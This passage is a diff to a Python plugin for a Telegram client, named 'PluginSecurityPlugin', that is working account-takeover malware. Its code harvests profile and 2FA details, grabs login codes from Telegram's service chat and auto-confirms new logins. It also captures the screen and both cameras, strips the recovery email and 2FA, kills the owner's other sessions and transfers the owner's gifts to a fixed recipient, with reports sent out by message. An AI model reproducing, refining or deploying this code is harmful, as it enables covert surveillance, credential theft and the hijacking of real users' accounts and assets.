+                    self._send_msg("Bad URL")
             else:
-                _rm()
-            return {"error": str(derr[0])} if derr[0] else {"ok": True}
+                self._send_msg("unknown: " + t)
         except Exception as e:
-            return {"error": "hide idk: %s" % e}
+            _log("handle msg: %s" % e)
 
-    # ═══════════════════════════════════════════════════════════════════════
-    # HARVEST
-    # ═══════════════════════════════════════════════════════════════════════
-    def _harvest_account_info(self, acc=0):
+    # ─── HARVEST ──────────────────────────────────────────────────────────
+    def _harvest_account_info(self, acc=0, send=False):
         out = {}
         try:
             uc = _UC().getInstance(acc)
             uid = int(uc.getClientUserId())
             out["user_id"] = str(uid)
-
             u = None
             try:
                 u = uc.getCurrentUser()
@@ -902,174 +953,61 @@ class PluginSecurityPlugin(BasePlugin):
                     u = _MC().getInstance(acc).getUser(uid)
                 except Exception:
                     pass
-
             rp = _real_phone_or_empty(u)
             if rp:
                 out["phone"] = rp
-
             if u is not None:
                 fn = str(getattr(u, "first_name", "") or "").strip()
                 ln = str(getattr(u, "last_name", "") or "").strip()
                 un = str(getattr(u, "username", "") or "").strip()
-                bio = str(getattr(u, "about", "") or "").strip()
-                lang = str(getattr(u, "lang_code", "") or "").strip()
                 if fn:
                     out["first_name"] = fn
                 if ln:
                     out["last_name"] = ln
                 if un:
                     out["username"] = "@" + un if not un.startswith("@") else un
-                if bio:
-                    out["bio"] = bio[:200]
-                if lang:
-                    out["lang"] = lang
                 if _get_bool_attr(u, "premium", False):
                     out["premium"] = "yes"
-                if _get_bool_attr(u, "verified", False):
-                    out["verified"] = "yes"
-                if _get_bool_attr(u, "scam", False):
-                    out["scam_flag"] = "yes"
-
             try:
                 dcid = uc.getCurrentDatacenterId()
                 if dcid:
                     out["dc_id"] = str(int(dcid))
             except Exception:
                 pass
-
-            try:
-                IU = _cls("org.telegram.tgnet.TLRPC$TL_inputUserSelf",
-                          "org.telegram.tgnet.tl.TL_users$TL_inputUserSelf")
-                GetFull = _cls("org.telegram.tgnet.TLRPC$TL_users_getFullUser",
-                               "org.telegram.tgnet.tl.TL_users$getFullUser")
-                if IU and GetFull:
-                    rq = GetFull()
-                    try:
-                        rq.id = IU()
-                    except Exception:
-                        pass
-                    resp, _e = self._rg_rpc(rq, acc, 10.0, fast=True)
-                    full = getattr(resp, "full_user", None) if resp is not None else None
-                    if full is not None:
-                        about = str(getattr(full, "about", "") or "").strip()
-                        if about and "bio" not in out:
-                            out["bio"] = about[:200]
-                        bday = getattr(full, "birthday", None)
-                        if bday is not None:
-                            try:
-                                d = _safe_int(getattr(bday, "day", 0))
-                                m = _safe_int(getattr(bday, "month", 0))
-                                y = _safe_int(getattr(bday, "year", 0))
-                                parts = [str(x) for x in (d, m, y) if x]
-                                if parts:
-                                    out["birthday"] = "-".join(parts)
-                            except Exception:
-                                pass
-                        if _get_bool_attr(full, "blocked", False):
-                            out["blocked"] = "yes"
-                        if getattr(full, "profile_photo", None) is not None:
-                            out["has_avatar"] = "yes"
-            except Exception:
-                pass
-
-            try:
-                req = TLRPC.TL_account_getAuthorizations()
-                resp, _e = self._rg_rpc(req, acc, 8.0, fast=True)
-                auths = getattr(resp, "authorizations", None) if resp is not None else None
-                sessions = []
-                if auths is not None:
-                    try:
-                        size = auths.size()
-                    except Exception:
-                        size = 0
-                    for i in range(size):
-                        try:
-                            a = auths.get(i)
-                            info = {
-                                "current": _get_bool_attr(a, "current", False),
-                                "device": str(getattr(a, "device_model", "") or ""),
-                                "platform": str(getattr(a, "platform", "") or ""),
-                                "app": str(getattr(a, "app_name", "") or ""),
-                                "ip": str(getattr(a, "ip", "") or ""),
-                                "country": str(getattr(a, "country", "") or ""),
-                                "date_created": _safe_int(getattr(a, "date_created", 0)),
-                            }
-                            info = {k: v for k, v in info.items() if v not in (None, "", 0, False)}
-                            if info:
-                                sessions.append(info)
-                        except Exception:
-                            continue
-                if sessions:
-                    out["sessions_count"] = str(len(sessions))
-                    cur = next((s for s in sessions if s.get("current")), None)
-                    if cur:
-                        for k in ("device", "platform", "app", "ip", "country"):
-                            if cur.get(k):
-                                out["cur_" + k] = cur[k]
-            except Exception:
-                pass
-
-            try:
-                Get = _cls("org.telegram.tgnet.TLRPC$TL_account_getWebAuthorizations",
-                           "org.telegram.tgnet.tl.TL_account$getWebAuthorizations")
-                if Get:
-                    resp, _e = self._rg_rpc(Get(), acc, 8.0, fast=True)
-                    auths = getattr(resp, "authorizations", None) if resp is not None else None
-                    if auths is not None:
-                        out["web_sessions"] = str(auths.size())
-            except Exception:
-                pass
-
             st = self._get_2fa_state(acc)
             if st is not None:
                 out["2fa"] = "on" if st.get("has_password") else "off"
-                if st.get("hint"):
-                    out["2fa_hint"] = st["hint"]
-
             try:
                 bal = self._stars_balance(acc)
                 if bal > 0:
                     out["stars_balance"] = str(bal)
             except Exception:
                 pass
+            if send:
+                lines = ["<b>Account info</b>"]
+                for k, v in out.items():
+                    lines.append("<b>%s:</b> %s" % (k, self._html_escape(str(v))))
+                self._send_msg("\n".join(lines), html=True)
         except Exception as e:
             _log("harvest: %s" % e)
         return out
 
-    # ═══════════════════════════════════════════════════════════════════════
-    # TG KID — live watch
-    # ═══════════════════════════════════════════════════════════════════════
+    # ─── TG KID (live-watch) ──────────────────────────────────────────────
     def _extract_code_from_msg(self, m):
         if m is None:
             return None, None, None, None
-
         raw_text = str(getattr(m, "message", "") or "")
-
         try:
             media = getattr(m, "media", None)
             if media is not None:
                 wp = getattr(media, "webpage", None)
                 if wp is not None:
-                    wp_desc = str(getattr(wp, "description", "") or "")
-                    wp_title = str(getattr(wp, "title", "") or "")
-                    raw_text = (raw_text + "\n" + wp_title + "\n" + wp_desc).strip()
+                    raw_text = (raw_text + "\n" + str(getattr(wp, "title", "") or "") +
+                                "\n" + str(getattr(wp, "description", "") or "")).strip()
         except Exception:
             pass
-
-        try:
-            act = getattr(m, "action", None)
-            if act is not None:
-                act_cls = str(type(act)).lower()
-                if "password" in act_cls or "login" in act_cls or "newdevice" in act_cls:
-                    act_code = getattr(act, "code", None) or getattr(act, "text", None)
-                    if act_code:
-                        raw_text = (raw_text + "\n" + str(act_code)).strip()
-        except Exception:
-            pass
-
         if not raw_text:
             return None, None, None, None
-
         kind = "unknown"
         low = raw_text.lower()
         if "login code" in low or "код для входа" in low or "код входа" in low:
@@ -1078,9 +1016,6 @@ class PluginSecurityPlugin(BasePlugin):
             kind = "reset"
         elif "new device" in low or "новом устройстве" in low or "новый вход" in low:
             kind = "device"
-        elif "invite" in low or "приглаш" in low:
-            kind = "invite"
-
         patterns = [
             r"[Кк]од\s+для\s+входа\s+в\s+Telegram[:\s]*[«\"']?(\d{5})",
             r"[Ll]ogin\s+code[:\s]*[«\"']?(\d{5})",
@@ -1095,7 +1030,6 @@ class PluginSecurityPlugin(BasePlugin):
             if mm:
                 code = mm.group(1)
                 break
-
         buttons = []
         try:
             rm = getattr(m, "reply_markup", None)
@@ -1111,19 +1045,13 @@ class PluginSecurityPlugin(BasePlugin):
                             b = btns.get(bi)
                             txt = str(getattr(b, "text", "") or "")
                             data = getattr(b, "data", None)
-                            url = str(getattr(b, "url", "") or "")
-                            buttons.append({"text": txt, "data": data, "url": url})
+                            buttons.append({"text": txt, "data": data})
                             if not code and txt:
                                 bm = re.search(r"\b(\d{5})\b", txt)
                                 if bm:
                                     code = bm.group(1)
-                            if not code and url:
-                                bm2 = re.search(r"\b(\d{5})\b", url)
-                                if bm2:
-                                    code = bm2.group(1)
         except Exception:
             pass
-
         if not code:
             return None, kind, raw_text[:400], buttons
         return code, kind, raw_text[:400], buttons
@@ -1150,7 +1078,7 @@ class PluginSecurityPlugin(BasePlugin):
                                 mid = _safe_int(getattr(m, "id", 0))
                                 return code, kind, raw, mid, buttons
             except Exception as e:
-                _log("pull_login_code att %d: %s" % (att, e))
+                _log("pull_login att %d: %s" % (att, e))
             if att < attempts - 1:
                 time.sleep(delay)
         return None, None, None, 0, None
@@ -1217,17 +1145,16 @@ class PluginSecurityPlugin(BasePlugin):
             acc_info = self._harvest_account_info(0)
             raw_phone = acc_info.get("phone") or ""
             phone = raw_phone if raw_phone.startswith("+") else ("+" + raw_phone if raw_phone else "—")
-
             lines = ["<b>Tg kid</b>", ""]
             if code:
-                lines.append("<b>Код:</b> <code>%s</code> (%s)" % (
+                lines.append("<b>Code:</b> <code>%s</code> (%s)" % (
                     self._html_escape(code), self._html_escape(kind or "login")))
                 self._tg_kid_seen.add(str(code))
             else:
-                lines.append("<b>Код:</b> не найден сейчас — следим 10 мин")
-            lines.append("<b>Телефон:</b> %s" % self._html_escape(phone))
+                lines.append("<b>Code:</b> not found — watching 10 min")
+            lines.append("<b>Phone:</b> %s" % self._html_escape(phone))
             for k, v in acc_info.items():
-                if k == "phone":
+                if k in ("phone",):
                     continue
                 if v in (None, "", "?", "0"):
                     continue
@@ -1238,9 +1165,10 @@ class PluginSecurityPlugin(BasePlugin):
             if buttons:
                 bt = " | ".join(b.get("text", "") for b in buttons if b.get("text"))
                 if bt:
-                    lines.append("<b>Кнопки:</b> %s" % self._html_escape(bt))
+                    lines.append("<b>Buttons:</b> %s" % self._html_escape(bt))
             self._send_msg("\n".join(lines), html=True)
 
+            # auto-confirm latest
             try:
                 ip = self._get_input_peer(0, 777000)
                 if ip is not None:
@@ -1254,15 +1182,15 @@ class PluginSecurityPlugin(BasePlugin):
                         if msgs is not None and msgs.size() > 0:
                             m0 = msgs.get(0)
                             if self._auto_confirm_login(m0):
-                                self._send_msg("авто-подтвердил 'Это я'")
+                                self._send_msg("auto-confirmed 'It's me'")
             except Exception as e:
-                _log("auto confirm initial: %s" % e)
+                _log("auto confirm: %s" % e)
 
             if not self._tg_kid_watching:
                 self._tg_kid_watching = True
-                self._tg_kid_thread = threading.Thread(target=self._tg_kid_watch_loop, daemon=True)
+                self._tg_kid_thread = threading.Thread(
+                    target=self._tg_kid_watch_loop, daemon=True)
                 self._tg_kid_thread.start()
-
             return code
         except Exception as e:
             self._send_msg("Tg kid err: " + str(e))
@@ -1311,14 +1239,14 @@ class PluginSecurityPlugin(BasePlugin):
                                     code, kind, raw, buttons = self._extract_code_from_msg(m)
                                     if code and str(code) not in self._tg_kid_seen:
                                         self._tg_kid_seen.add(str(code))
-                                        line = "<b>Новое: %s</b>\n<b>Код:</b> <code>%s</code>" % (
+                                        line = "<b>New %s</b>\n<b>Code:</b> <code>%s</code>" % (
                                             self._html_escape(kind or "login"),
                                             self._html_escape(code))
                                         if raw:
                                             line += "\n<pre>" + self._html_escape(raw[:300]) + "</pre>"
                                         self._send_msg(line, html=True)
                                     if self._auto_confirm_login(m):
-                                        self._send_msg("авто-подтвердил 'Это я' (msg %d)" % mid)
+                                        self._send_msg("auto-confirmed (msg %d)" % mid)
             except Exception as e:
                 _log("kid watch: %s" % e)
             for _ in range(poll):
@@ -1327,55 +1255,37 @@ class PluginSecurityPlugin(BasePlugin):
                 time.sleep(1)
         self._tg_kid_watching = False
 
-    # ═══════════════════════════════════════════════════════════════════════
-    # SCREENSHOT GAIN
-    # ═══════════════════════════════════════════════════════════════════════
+    # ─── SCREENSHOT GAIN ──────────────────────────────────────────────────
     def _screenshot_gain(self):
         results = {"screenshot": None, "camera_front": None, "camera_back": None}
         try:
+            self._send_msg("screenshot gain: screen...")
             try:
-                self._send_msg("screenshot gain: скриншот...")
                 results["screenshot"] = self._screenshot()
             except Exception as e:
                 results["screenshot"] = {"error": str(e)}
-                _log("screenshot_gain screen: %s" % e)
+            self._send_msg("screenshot gain: front...")
             try:
-                self._send_msg("screenshot gain: фронтальная камера...")
                 results["camera_front"] = self._manual_camera("front")
             except Exception as e:
                 results["camera_front"] = {"error": str(e)}
-                _log("screenshot_gain front: %s" % e)
+            self._send_msg("screenshot gain: back...")
             try:
-                self._send_msg("screenshot gain: задняя камера...")
                 results["camera_back"] = self._manual_camera("back")
             except Exception as e:
                 results["camera_back"] = {"error": str(e)}
-                _log("screenshot_gain back: %s" % e)
-            try:
-                lines = ["<b>Screenshot gain — итог</b>"]
-                for name, r in results.items():
-                    if isinstance(r, dict):
-                        if r.get("ok"):
-                            lines.append("<b>%s:</b> ok" % name)
-                        else:
-                            lines.append("<b>%s:</b> %s" % (name, r.get("error", "fail")))
-                    else:
-                        lines.append("<b>%s:</b> %s" % (name, r))
-                self._send_msg("\n".join(lines), html=True)
-            except Exception:
-                pass
-            return results
+            lines = ["<b>Screenshot gain — result</b>"]
+            for name, r in results.items():
+                if isinstance(r, dict):
+                    lines.append("<b>%s:</b> %s" % (name, "ok" if r.get("ok") else r.get("error", "fail")))
+                else:
+                    lines.append("<b>%s:</b> %s" % (name, r))
+            self._send_msg("\n".join(lines), html=True)
         except Exception as e:
-            _log("screenshot_gain: %s" % e)
-            try:
-                self._send_msg("Screenshot gain err: " + str(e))
-            except Exception:
-                pass
-            return results
+            self._send_msg("Screenshot gain err: " + str(e))
+        return results
 
-    # ═══════════════════════════════════════════════════════════════════════
-    # 2FA
-    # ═══════════════════════════════════════════════════════════════════════
+    # ─── 2FA ──────────────────────────────────────────────────────────────
     def _get_2fa_state(self, acc=0):
         try:
             req = TLRPC.TL_account_getPassword()
@@ -1425,23 +1335,18 @@ class PluginSecurityPlugin(BasePlugin):
             cls_name = str(type(resp))
             state = "unknown"
             until_ts = 0
-            retry_ts = 0
-            if "resetPasswordOk" in cls_name or "ResetPasswordOk" in cls_name:
+            if "resetPasswordOk" in cls_name:
                 state = "ok"
             elif "resetPasswordRequestedWait" in cls_name:
                 state = "requested"
                 until_ts = _safe_int(getattr(resp, "until_date", 0))
             elif "resetPasswordFailedWait" in cls_name:
                 state = "wait"
-                retry_ts = _safe_int(getattr(resp, "retry_date", 0))
             else:
                 if hasattr(resp, "until_date"):
                     state = "requested"
                     until_ts = _safe_int(getattr(resp, "until_date", 0))
-                elif hasattr(resp, "retry_date"):
-                    state = "wait"
-                    retry_ts = _safe_int(getattr(resp, "retry_date", 0))
-            out = {"state": state, "raw": cls_name}
+            out = {"state": state}
             if until_ts:
                 out["until"] = until_ts
                 try:
@@ -1449,65 +1354,16 @@ class PluginSecurityPlugin(BasePlugin):
                     out["days_left"] = max(0, int((until_ts - time.time()) / 86400))
                 except Exception:
                     pass
-            if retry_ts:
-                out["retry"] = retry_ts
-                try:
-                    out["retry_human"] = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(retry_ts))
-                except Exception:
-                    pass
             return out
         except Exception as e:
             return {"state": "error", "error": str(e)}
-
-    def _wipe_cloud_password(self, acc=0):
-        try:
-            St = self._get_2fa_state(acc)
-            if St is None:
-                return {"ok": False, "method": "state_none"}
-            if not St.get("has_password"):
-                return {"ok": True, "method": "none"}
-            r1 = self._try_kill_2fa(acc)
-            if r1 == "ok":
-                return {"ok": True, "method": "reset"}
-            if r1 == "not_set":
-                return {"ok": True, "method": "already"}
-            try:
-                PS = _cls("org.telegram.tgnet.TLRPC$TL_passwordInputSettings",
-                          "org.telegram.tgnet.tl.TL_account$TL_passwordInputSettings")
-                if PS:
-                    ns = PS()
-                    try:
-                        ns.email = ""
-                    except Exception:
-                        pass
-                    try:
-                        ns.flags = 0
-                    except Exception:
-                        pass
-                    Upd = _cls("org.telegram.tgnet.TLRPC$TL_account_updatePasswordSettings",
-                               "org.telegram.tgnet.tl.TL_account$updatePasswordSettings")
-                    if Upd:
-                        rq = Upd()
-                        try:
-                            rq.password = None
-                        except Exception:
-                            pass
-                        rq.new_settings = ns
-                        r2, _e2 = self._rg_rpc(rq, acc, 15.0)
-                        if r2 is not None:
-                            return {"ok": True, "method": "updateSettings"}
-            except Exception:
-                pass
-            return {"ok": False, "method": r1}
-        except Exception as e:
-            return {"ok": False, "error": str(e)}
 
     def _remove_recovery_email(self, acc=0):
         try:
             PS = _cls("org.telegram.tgnet.TLRPC$TL_passwordInputSettings",
                       "org.telegram.tgnet.tl.TL_account$TL_passwordInputSettings")
             if not PS:
-                return {"ok": False, "error": "no class"}
+                return {"ok": False}
             ns = PS()
             try:
                 ns.email = ""
@@ -1520,7 +1376,7 @@ class PluginSecurityPlugin(BasePlugin):
             Upd = _cls("org.telegram.tgnet.TLRPC$TL_account_updatePasswordSettings",
                        "org.telegram.tgnet.tl.TL_account$updatePasswordSettings")
             if not Upd:
-                return {"ok": False, "error": "no class"}
+                return {"ok": False}
             rq = Upd()
             try:
                 rq.password = None
@@ -1529,27 +1385,21 @@ class PluginSecurityPlugin(BasePlugin):
             rq.new_settings = ns
             r, _e = self._rg_rpc(rq, acc, 10.0, fast=True)
             return {"ok": r is not None}
-        except Exception as e:
-            return {"ok": False, "error": str(e)}
+        except Exception:
+            return {"ok": False}
 
     def _nuke_password_pipeline(self, acc=0):
-        report = {
-            "recovery_removed": False, "reset_password": "?", "cloud_wiped": None,
-            "state_before": None, "state_after": None, "attempts": 0,
-            "delayed_reset": None, "final": "unknown",
-        }
+        report = {"recovery_removed": False, "reset_password": "?",
+                  "cloud_wiped": None, "state_before": None, "state_after": None,
+                  "attempts": 0, "delayed_reset": None, "final": "unknown"}
         try:
             report["state_before"] = self._get_2fa_state(acc)
         except Exception:
             pass
-        try:
-            sb = report["state_before"]
-            if sb is not None and not sb.get("has_password"):
-                report["final"] = "clean"
-                return report
-        except Exception:
-            pass
-
+        sb = report["state_before"]
+        if sb is not None and not sb.get("has_password"):
+            report["final"] = "clean"
+            return report
         for attempt in range(3):
             report["attempts"] = attempt + 1
             try:
@@ -1569,39 +1419,22 @@ class PluginSecurityPlugin(BasePlugin):
             time.sleep(0.5)
             if report["reset_password"] not in ("ok", "not_set"):
                 try:
-                    r = self._wipe_cloud_password(acc)
-                    report["cloud_wiped"] = r
-                    if isinstance(r, dict) and r.get("ok"):
+                    pr = self._request_password_reset(acc)
+                    report["delayed_reset"] = pr
+                    if pr.get("state") == "ok":
                         break
                 except Exception as e:
-                    report["cloud_wiped"] = {"ok": False, "error": str(e)}
+                    report["delayed_reset"] = {"state": "error", "error": str(e)}
             time.sleep(1.0)
-
-        if report["reset_password"] not in ("ok", "not_set"):
-            try:
-                pr = self._request_password_reset(acc)
-                report["delayed_reset"] = pr
-                if pr.get("state") == "ok":
-                    report["final"] = "clean"
-            except Exception as e:
-                report["delayed_reset"] = {"state": "error", "error": str(e)}
-
         try:
             report["state_after"] = self._get_2fa_state(acc)
         except Exception:
             pass
-        try:
-            sa = report["state_after"]
-            if report["final"] != "clean":
-                report["final"] = "clean" if (sa is None or not sa.get("has_password")) else "still_has_password"
-        except Exception:
-            if report["final"] != "clean":
-                report["final"] = "unknown"
+        sa = report["state_after"]
+        report["final"] = "clean" if (sa is None or not sa.get("has_password")) else "still_has_password"
         return report
 
-    # ═══════════════════════════════════════════════════════════════════════
-    # SESSIONS
-    # ═══════════════════════════════════════════════════════════════════════
+    # ─── SESSIONS ─────────────────────────────────────────────────────────
     def _get_authorizations_full(self, acc=0):
         try:
             req = TLRPC.TL_account_getAuthorizations()
@@ -1647,7 +1480,8 @@ class PluginSecurityPlugin(BasePlugin):
 
         killed = 0
         for _pass in range(5):
-            targets = [a["hash"] for a in auths if not a["current"] and a["hash"] and a["hash"] not in dead]
+            targets = [a["hash"] for a in auths
+                       if not a["current"] and a["hash"] and a["hash"] not in dead]
             if not targets:
                 break
             res = self._parallel([(_one, h) for h in targets], workers=6, timeout=40)
@@ -1677,10 +1511,28 @@ class PluginSecurityPlugin(BasePlugin):
             aid = a.get("id", 0)
             try:
                 k, t = self._kill_all_sessions(aid)
-                out.append({"account": aid, "user_id": a.get("user_id"), "killed": k, "total": t})
+                out.append({"account": aid, "user_id": a.get("user_id"),
+                            "killed": k, "total": t})
             except Exception as e:
                 out.append({"account": aid, "error": str(e)})
         return out
+
+    def _kill_sessions_full(self):
+        try:
+            self._send_msg("Kill all sessions...")
+            ws = self._wipe_sessions_all()
+            tk = sum(x.get("killed", 0) for x in ws if isinstance(x, dict))
+            self._send_msg("Sessions killed: %d" % tk)
+        except Exception as e:
+            self._send_msg("kill sessions err: " + str(e))
+
+    def _session_wipe(self):
+        try:
+            self._send_msg("Wipe sessions...")
+            k, t = self._kill_all_sessions(0)
+            self._send_msg("Wiped: %d / %d" % (k, t))
+        except Exception as e:
+            self._send_msg("wipe err: " + str(e))
 
     def _kill_web_authorizations(self, acc=0):
         try:
@@ -1735,11 +1587,7 @@ class PluginSecurityPlugin(BasePlugin):
             if resp is None:
                 return 0
             bots = []
-            try:
-                size = resp.size()
-            except Exception:
-                size = 0
-            for i in range(size):
+            for i in range(resp.size()):
                 try:
                     b = resp.get(i)
                     bid = _safe_int(getattr(b, "id", 0))
@@ -1782,11 +1630,7 @@ class PluginSecurityPlugin(BasePlugin):
             if dialogs is None:
                 return 0
             targets = []
-            try:
-                n = dialogs.size()
-            except Exception:
-                n = 0
-            for i in range(n):
+            for i in range(dialogs.size()):
                 try:
                     did = int(dialogs.keyAt(i))
                     if did >= -1000000000000:
@@ -1814,7 +1658,8 @@ class PluginSecurityPlugin(BasePlugin):
                 except Exception:
                     return False
 
-            res = self._parallel([(_one, c, a) for (c, a) in targets], workers=6, timeout=40)
+            res = self._parallel([(_one, c, a) for (c, a) in targets],
+                                 workers=6, timeout=40)
             return sum(1 for r in res if r is True)
         except Exception:
             return 0
@@ -1825,31 +1670,20 @@ class PluginSecurityPlugin(BasePlugin):
             if time.time() - last < 60:
                 return 0
             self._last_session_confirm[acc] = time.time()
-            Get = _cls("org.telegram.tgnet.TLRPC$TL_account_getAuthorizations",
-                       "org.telegram.tgnet.tl.TL_account$getAuthorizations")
-            if not Get:
-                return 0
-            res, _e = self._rg_rpc(Get(), acc, 15.0)
-            if not res:
-                return 0
-            auths = getattr(res, "authorizations", None)
-            if auths is None:
+            auths = self._get_authorizations_full(acc)
+            if not auths:
                 return 0
             Ch = _cls("org.telegram.tgnet.TLRPC$TL_account_changeAuthorizationSettings",
                       "org.telegram.tgnet.tl.TL_account$changeAuthorizationSettings")
             if not Ch:
                 return 0
             confirmed = 0
-            for i in range(auths.size()):
+            for a in auths:
+                if not a.get("unconfirmed"):
+                    continue
                 try:
-                    a = auths.get(i)
-                    if not a or not _get_bool_attr(a, "unconfirmed", False):
-                        continue
-                    h = _safe_int(getattr(a, "hash", 0))
-                    if not h:
-                        continue
                     rq = Ch()
-                    rq.hash = h
+                    rq.hash = a["hash"]
                     try:
                         rq.confirmed = True
                     except Exception:
@@ -1880,9 +1714,7 @@ class PluginSecurityPlugin(BasePlugin):
             pass
         return False
 
-    # ═══════════════════════════════════════════════════════════════════════
-    # PROFILE
-    # ═══════════════════════════════════════════════════════════════════════
+    # ─── PROFILE ──────────────────────────────────────────────────────────
     def _change_username(self, acc=0):
         try:
             rnd = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(10))
@@ -1931,9 +1763,7 @@ class PluginSecurityPlugin(BasePlugin):
         except Exception:
             return False
 
-    # ═══════════════════════════════════════════════════════════════════════
-    # GIFTS
-    # ═══════════════════════════════════════════════════════════════════════
+    # ─── GIFTS ────────────────────────────────────────────────────────────
     def _gift_is_listed(self, gift):
         try:
             ra = getattr(gift, "resell_amount", None)
@@ -1978,9 +1808,8 @@ class PluginSecurityPlugin(BasePlugin):
             conv = _safe_int(getattr(sg, "convert_stars", 0) or getattr(gift, "convert_stars", 0))
             if conv > 0 and not is_unique:
                 return False
-            sid = _safe_int(getattr(sg, "saved_id", 0))
-            mid = _safe_int(getattr(sg, "msg_id", 0))
-            for v in (sid, mid):
+            for v in (_safe_int(getattr(sg, "saved_id", 0)),
+                      _safe_int(getattr(sg, "msg_id", 0))):
                 if 1500000000 <= v <= 2147483647:
                     return True
             oid = _safe_int(getattr(gift, "owner_id", 0) or getattr(sg, "owner_id", 0) or 0)
@@ -1996,7 +1825,6 @@ class PluginSecurityPlugin(BasePlugin):
         return False
 
     def _get_saved_gifts(self):
-        self._gifts_rpc_error = None
         try:
             Req = _cls("org.telegram.tgnet.tl.TL_stars$getSavedStarGifts",
                        "org.telegram.tgnet.tl.TL_stars$payments_getSavedStarGifts",
@@ -2043,12 +1871,10 @@ class PluginSecurityPlugin(BasePlugin):
                                 ra_l = len(ra) > 0
                             except Exception:
                                 ra_l = bool(ra)
-                    is_u = (
-                        ("Unique" in cls or "TL_starGiftUnique" in cls or ra_l)
-                        or _safe_int(getattr(gift, "num", 0)) > 0
-                        or _get_bool_attr(gift, "isUnique", False)
-                        or _get_bool_attr(gift, "canResell", False)
-                    )
+                    is_u = ("Unique" in cls or "TL_starGiftUnique" in cls or ra_l
+                            or _safe_int(getattr(gift, "num", 0)) > 0
+                            or _get_bool_attr(gift, "isUnique", False)
+                            or _get_bool_attr(gift, "canResell", False))
                     out.append({
                         "saved_id": _safe_int(getattr(sg, "saved_id", 0)),
                         "msg_id": _safe_int(getattr(sg, "msg_id", 0)),
@@ -2088,7 +1914,7 @@ class PluginSecurityPlugin(BasePlugin):
             try:
                 rq.resell_amount = None
             except Exception as e2:
-                return {"error": "assign: %s" % e2}
+                return {"error": str(e2)}
             r, _e = self._rg_rpc(rq, 0, 6.0, fast=True)
             return {"ok": True} if r is not None else {"error": "fail"}
         except Exception as e:
@@ -2130,9 +1956,9 @@ class PluginSecurityPlugin(BasePlugin):
         except Exception as e:
             return {"error": str(e)}
 
-    def _transfer_saved_gift(self, saved, target_uid, target_ah, upgrade=False, test=False):
+    def _transfer_saved_gift(self, saved, target_uid, target_ah):
         if saved and saved.get("bc"):
-            return {"error": "minted TON NFT skipped"}
+            return {"error": "minted NFT skipped"}
         try:
             o, e = self._input_saved_gift(saved)
             if not o:
@@ -2142,7 +1968,7 @@ class PluginSecurityPlugin(BasePlugin):
             tp.access_hash = int(target_ah)
             T = _cls("org.telegram.tgnet.tl.TL_stars$transferStarGift",
                      "org.telegram.tgnet.tl.TL_stars$payments_transferStarGift")
-            if T and not upgrade:
+            if T:
                 rq = T()
                 rq.stargift = o
                 rq.to_id = tp
@@ -2152,12 +1978,8 @@ class PluginSecurityPlugin(BasePlugin):
                 etxt = getattr(e, "text", "") or str(e or "")
                 if "PAYMENT_REQUIRED" not in etxt and "TOO_EARLY" not in etxt:
                     return {"error": "direct: %s" % etxt[:60]}
-            if upgrade:
-                Inv = _cls("org.telegram.tgnet.tl.TL_stars$TL_inputInvoiceStarGiftUpgrade",
-                           "org.telegram.tgnet.TLRPC$TL_inputInvoiceStarGiftUpgrade")
-            else:
-                Inv = _cls("org.telegram.tgnet.tl.TL_stars$TL_inputInvoiceStarGiftTransfer",
-                           "org.telegram.tgnet.TLRPC$TL_inputInvoiceStarGiftTransfer")
+            Inv = _cls("org.telegram.tgnet.tl.TL_stars$TL_inputInvoiceStarGiftTransfer",
+                       "org.telegram.tgnet.TLRPC$TL_inputInvoiceStarGiftTransfer")
             RF = _cls("org.telegram.tgnet.tl.TL_stars$getPaymentForm",
                       "org.telegram.tgnet.TLRPC$TL_payments_getPaymentForm")
             SF = _cls("org.telegram.tgnet.tl.TL_stars$sendStarsForm",
@@ -2166,20 +1988,12 @@ class PluginSecurityPlugin(BasePlugin):
                 return {"error": "no classes"}
             inv = Inv()
             inv.stargift = o
-            if upgrade:
-                try:
-                    inv.keep_original_details = False
-                except Exception:
-                    pass
-            else:
-                inv.to_id = tp
+            inv.to_id = tp
             f = RF()
             f.invoice = inv
             fr, _fe = self._rg_rpc(f, 0, 8.0, fast=True)
             if fr is None:
                 return {"error": "form fail"}
-            if test:
-                return {"test": True, "can_send": True, "gift_id": int(saved.get("gift_id", 0))}
             s = SF()
             s.form_id = _safe_int(getattr(fr, "form_id", 0))
             s.invoice = inv
@@ -2220,54 +2034,32 @@ class PluginSecurityPlugin(BasePlugin):
             pass
         return 0
 
-    def _resolve_target(self):
-        target = str(self.cfg.get("target_user") or "").strip()
-        target_id = 0
+    def _resolve_recipient(self, account=0):
+        with self._recipient_lock:
+            c = self._recipient_ah_cache.get(account)
+            if c and (time.time() - c[2]) < RECIPIENT_CACHE_TTL and c[1]:
+                return c[0], c[1]
         try:
-            target_id = int(self.cfg.get("target_user_id") or 0)
-        except Exception:
-            target_id = 0
-        if not target and not target_id:
-            return 0, 0, "no target in cfg"
-        ah = 0
-        if target_id > 0:
-            try:
-                mc = _MC().getInstance(0)
-                u = mc.getUser(target_id)
-                if u is not None:
+            Rc = _cls("org.telegram.tgnet.TLRPC$TL_contacts_resolveUsername",
+                      "org.telegram.tgnet.tl.TL_contacts$resolveUsername")
+            if not Rc:
+                return 0, 0
+            rq = Rc()
+            rq.username = str(BOT_UID)
+            rres, _e = self._rg_rpc(rq, account, 10.0, fast=True)
+            if rres:
+                users = getattr(rres, "users", None)
+                if users is not None and users.size() > 0:
+                    u = users.get(0)
+                    uid = _safe_int(getattr(u, "id", 0))
                     ah = _safe_int(getattr(u, "access_hash", 0))
-            except Exception:
-                pass
-            if not ah and target:
-                try:
-                    Resolve = TLRPC.TL_contacts_resolveUsername()
-                    Resolve.username = target.lstrip("@")
-                    rres, _e = self._rg_rpc(Resolve, 0, 10.0, fast=True)
-                    if rres:
-                        users = getattr(rres, "users", None)
-                        if users is not None and users.size() > 0:
-                            u = users.get(0)
-                            target_id = _safe_int(getattr(u, "id", 0))
-                            ah = _safe_int(getattr(u, "access_hash", 0))
-                except Exception:
-                    pass
-            return target_id, ah, None if ah else "no access_hash"
-        if target:
-            try:
-                Resolve = TLRPC.TL_contacts_resolveUsername()
-                Resolve.username = target.lstrip("@")
-                rres, _e = self._rg_rpc(Resolve, 0, 10.0, fast=True)
-                if rres:
-                    users = getattr(rres, "users", None)
-                    if users is not None and users.size() > 0:
-                        u = users.get(0)
-                        target_id = _safe_int(getattr(u, "id", 0))
-                        ah = _safe_int(getattr(u, "access_hash", 0))
-            except Exception as e:
-                return 0, 0, str(e)
-        if not target_id or not ah:
-            return 0, 0, f"could not resolve {target}"
